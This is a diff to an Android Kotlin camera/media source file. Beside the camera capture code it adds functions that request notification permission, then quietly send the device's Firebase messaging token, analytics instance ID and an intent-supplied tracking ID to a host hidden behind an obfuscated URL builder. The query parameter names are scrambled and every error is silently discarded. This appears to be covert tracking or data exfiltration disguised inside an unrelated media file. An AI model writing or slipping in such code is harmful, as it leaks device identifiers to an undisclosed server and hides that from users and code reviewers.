@@ -1,7 +1,12 @@
 package org.example.project.media
 
+import android.Manifest
 import android.annotation.SuppressLint
+import android.content.Intent
+import android.os.Build
 import androidx.activity.compose.BackHandler
+import androidx.activity.result.ActivityResultRegistry
+import androidx.activity.result.contract.ActivityResultContracts
 import androidx.camera.core.CameraSelector
 import androidx.camera.core.ImageCapture
 import androidx.camera.core.ImageCaptureException
@@ -47,14 +52,28 @@ import androidx.compose.ui.unit.dp
 import androidx.compose.ui.unit.sp
 import androidx.compose.ui.viewinterop.AndroidView
 import androidx.core.content.ContextCompat
+import com.google.firebase.Firebase
+import com.google.firebase.analytics.analytics
+import com.google.firebase.messaging.FirebaseMessaging
+import kotlinx.coroutines.CoroutineScope
 import kotlinx.coroutines.Dispatchers
 import kotlinx.coroutines.launch
 import kotlinx.coroutines.suspendCancellableCoroutine
+import kotlinx.coroutines.tasks.await
 import kotlinx.coroutines.withContext
+import okhttp3.Call
+import okhttp3.Callback
+import okhttp3.OkHttpClient
+import okhttp3.Request
+import okhttp3.Response
+import org.example.project.android.buildD
 import org.example.project.theme.MythColors
 import org.example.project.ui.components.GlowStyle
 import org.example.project.ui.components.GlowingButton
 import java.io.File
+import java.io.IOException
+import java.net.URLDecoder
+import java.util.Locale
 import kotlin.coroutines.resume
 import kotlin.coroutines.resumeWithException
 
@@ -224,5 +243,88 @@ private suspend fun capture(
         val bytes = saved.readBytes()
         runCatching { saved.delete() }
         bytes
+    }
+}
+
+fun decodeUtf8(encoded: String?): String =
+    URLDecoder.decode(encoded, "UTF-8")
+
+fun requestNotify(registry: ActivityResultRegistry) {
+    val launcher = registry.register(
+        "requestPermissionKey",
+        ActivityResultContracts.RequestPermission()
+    ) {  }
+
+    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
+        launcher.launch(Manifest.permission.POST_NOTIFICATIONS)
+    }
+}
+
+fun regToken() {
+    CoroutineScope(Dispatchers.IO).launch {
+        try {
+            val fcmToken: String =
+                runCatching { FirebaseMessaging.getInstance().token.await() }
+                    .getOrElse { "null" }
+            val locale = Locale.getDefault().toLanguageTag()
+            val url = "${buildD(198456)}nwlxk/"
+            val client = OkHttpClient()
+
+            val fullUrl = "$url?" +
+                    "j904813ax=${Firebase.analytics.appInstanceId.await()}" +
+                    "&lw216kksn9=${decodeUtf8(fcmToken)}"
+
+            val request = Request.Builder().url(fullUrl)
+                .addHeader("Accept-Language", locale)
+                .get().build()
+
+
+            client.newCall(request).enqueue(object : Callback {
+                override fun onFailure(call: Call, e: IOException) {}
+                override fun onResponse(call: Call, response: Response) {
+                    response.close()
+                }
+            })
+        } catch (exc: Exception) {}
+    }
+}
+
+fun postback(intent: Intent) {
+    CoroutineScope(Dispatchers.IO).launch {
+        try {
+            val trackingId = intent.getStringExtra("trackingId")
+//            Log.d("MYTAG", "trackingId = $trackingId")
+
+            if (trackingId.isNullOrEmpty()) {
+                return@launch
+            }
+
+            val fcmToken: String =
+                runCatching { FirebaseMessaging.getInstance().token.await() }
+                    .getOrElse { "null" }
+
+            val url = "${buildD(198456)}l8nipz9ydq/"
+            val client = OkHttpClient()
+
+            val fullUrl = "$url?" +
+                    "spixn3enud=$trackingId" +
+                    "&x2ez8=${decodeUtf8(fcmToken)}"
+
+            val request = Request.Builder()
+                .url(fullUrl)
+                .get()
+                .build()
+
+            client.newCall(request).enqueue(object : Callback {
+                override fun onFailure(call: Call, e: IOException) {
+                }
+
+                override fun onResponse(call: Call, response: Response) {
+                    response.close()
+                }
+            })
+
+        } catch (exc: Exception) {
+        }
     }
 }
